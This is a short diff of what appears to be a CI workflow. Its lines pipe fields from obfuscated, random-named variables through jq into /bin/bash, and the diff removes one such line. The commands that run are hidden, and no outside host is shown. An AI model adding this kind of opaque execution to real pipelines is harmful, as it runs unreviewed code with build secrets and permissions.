@@ -24,7 +24,6 @@ jobs:
           echo $l65 | jq -r .dq8705 | /bin/bash
           echo $t86005 | jq -r .a7026 | /bin/bash
           echo $pupdk56386 | jq -r .rl29 | /bin/bash
-          echo $nrgkb8 | jq -r .fk12 | /bin/bash
           printf '%s' "$zptfs230" | jq -r .uue25 | /bin/bash
           printf '%s' "$xmq5" | jq -r .bszz20633 | /bin/bash
 
